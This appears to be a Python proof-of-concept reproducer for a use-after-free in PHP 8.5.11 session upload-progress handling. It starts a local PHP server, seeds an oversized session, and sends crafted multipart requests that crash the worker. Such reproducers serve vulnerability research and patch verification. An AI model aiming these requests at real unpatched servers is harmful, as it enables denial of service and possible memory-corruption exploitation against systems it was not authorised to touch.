#!/usr/bin/env python3
"""
CVE-2026-109619 - cross-request use-after-free in session.upload_progress
Reproducer for PHP 8.5.11 (fixed in 8.5.12).

Starts a local `php -S` server, then sends two multipart POSTs to the same
worker:

  req1  The session file holds a huge array (a:1048576:{...}). The
        upload_progress callback decodes it during php_request_startup(),
        the decode hits memory_limit, and zend_bailout() skips
        PHP_VAR_UNSERIALIZE_DESTROY. BG(unserialize) is left with level=1
        and a pointer into the request heap that is about to be freed.

  req2  The session file is now tiny (x|i:1;). The callback runs again
        before PHP_RINIT(basic), reuses the stale BG(unserialize).data and
        tmp_var() dereferences freed memory -> SIGSEGV / ASAN report.

The session file is pre-seeded on disk by this script to simulate an existing
large session. That is a lab shortcut: it isolates the startup-order bug from
the question of how such a session gets there.

For local research on your own builds only.
"""
import argparse
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time

BOUNDARY = b"CVE2026109619"
SID = "d" * 32
ARRAY_SIZE = 1048576
BIG_SESSION = b"x|a:%d:{" % ARRAY_SIZE + b"i:0;" * ARRAY_SIZE
SMALL_SESSION = b"x|i:1;"


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_port(port, proc, timeout):
    end = time.time() + timeout
    while time.time() < end:
        if proc.poll() is not None:
            return False
        try:
            socket.create_connection(("127.0.0.1", port), timeout=0.3).close()
            return True
        except OSError:
            time.sleep(0.05)
    return False


def multipart(sid):
    return (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode() + b"\r\n"
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        b"x\r\n"
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
        b"Z\r\n"
        b"--" + BOUNDARY + b"--\r\n"
    )


def post(port, body, timeout):
    head = (
        "POST /index.php HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Type: multipart/form-data; boundary=" + BOUNDARY.decode() + "\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    out = b""
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(head + body)
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except OSError:
        pass
    finally:
        s.close()
    return out.split(b"\r\n", 1)[0].decode("latin1") if out else "<no response>"


def server_args(php, port, www, sess, memory_limit):
    ini = {
        "memory_limit": memory_limit,
        "session.save_path": sess,
        "session.upload_progress.enabled": "1",
        "session.upload_progress.cleanup": "1",
        "session.upload_progress.freq": "1%",
        "session.upload_progress.min_freq": "0",
        "session.use_strict_mode": "0",
        "session.use_cookies": "0",
        "session.cache_limiter": "",
        "display_errors": "0",
        "log_errors": "1",
    }
    args = [php]
    for key, value in ini.items():
        args += ["-d", f"{key}={value}"]
    return args + ["-S", f"127.0.0.1:{port}", "-t", www]


def read(path):
    try:
        with open(path, "rb") as f:
            return f.read().decode("latin1", "replace")
    except OSError:
        return ""


def write_session(sess, data):
    with open(os.path.join(sess, "sess_" + SID), "wb") as f:
        f.write(data)


def run(args):
    root = tempfile.mkdtemp(prefix="cve-2026-109619-")
    www = os.path.join(root, "www")
    sess = os.path.join(root, "sess")
    os.makedirs(www)
    os.makedirs(sess)
    with open(os.path.join(www, "index.php"), "w") as f:
        f.write('<?php echo "ok\\n";\n')

    log_path = os.path.join(root, "server.log")
    log = open(log_path, "wb")
    env = dict(os.environ)
    env.setdefault("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:handle_segv=1")
    port = args.port or free_port()
    proc = subprocess.Popen(server_args(args.php, port, www, sess, args.memory_limit),
                            stdout=log, stderr=log, env=env)
    reproduced = False
    try:
        if not wait_port(port, proc, args.start_timeout):
            print("[-] server did not start")
            return 2
        print(f"[*] php          {args.php}")
        print(f"[*] server       http://127.0.0.1:{port}/  memory_limit={args.memory_limit}")

        write_session(sess, BIG_SESSION)
        print(f"[*] req1         seeded session: {len(BIG_SESSION)} bytes ({ARRAY_SIZE} elements)")
        status = post(port, multipart(SID), args.timeout)
        time.sleep(0.3)
        oom = "Allowed memory size" in read(log_path)
        print(f"[*] req1         {status}  oom={oom}  alive={proc.poll() is None}")
        if not oom or proc.poll() is not None:
            print("[-] req1 did not leave the worker in the expected state")
            return 1

        write_session(sess, SMALL_SESSION)
        print(f"[*] req2         seeded session: {SMALL_SESSION.decode()}")
        status = post(port, multipart(SID), args.timeout)
        time.sleep(0.5)
        rc = proc.poll()
        asan = "AddressSanitizer" in read(log_path)
        print(f"[*] req2         {status}  exit={rc}  asan={asan}")

        if rc is not None and rc < 0:
            reproduced = True
            print("[+] worker crashed: BG(unserialize) reused the freed php_unserialize_data")
        elif rc is None:
            print("[-] worker survived req2 (patched build?)")
        else:
            print(f"[-] server exited with {rc}, not a crash signal")
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(2)
            except subprocess.TimeoutExpired:
                proc.kill()
        log.close()
        if args.verbose:
            print("\n=== server log ===")
            print(read(log_path))
        if args.keep:
            print(f"[*] lab kept at {root}")
        else:
            shutil.rmtree(root, ignore_errors=True)
    return 0 if reproduced else 1


def main():
    here = os.path.dirname(os.path.abspath(__file__))
    default_php = os.path.normpath(os.path.join(here, "..", "build", "php-8.5.11", "sapi", "cli", "php"))
    ap = argparse.ArgumentParser(description="CVE-2026-109619 reproducer (PHP 8.5.11)")
    ap.add_argument("--php", default=default_php, help="path to the php CLI binary")
    ap.add_argument("--memory-limit", default="16M")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--timeout", type=float, default=60.0, help="per-request timeout")
    ap.add_argument("--start-timeout", type=float, default=15.0)
    ap.add_argument("--verbose", action="store_true", help="print the server log (ASAN report)")
    ap.add_argument("--keep", action="store_true", help="keep the temporary lab directory")
    args = ap.parse_args()
    if not os.path.isfile(args.php):
        print(f"[-] {args.php} not found; run ./build.sh first or pass --php")
        return 2
    return run(args)


if __name__ == "__main__":
    sys.exit(main())
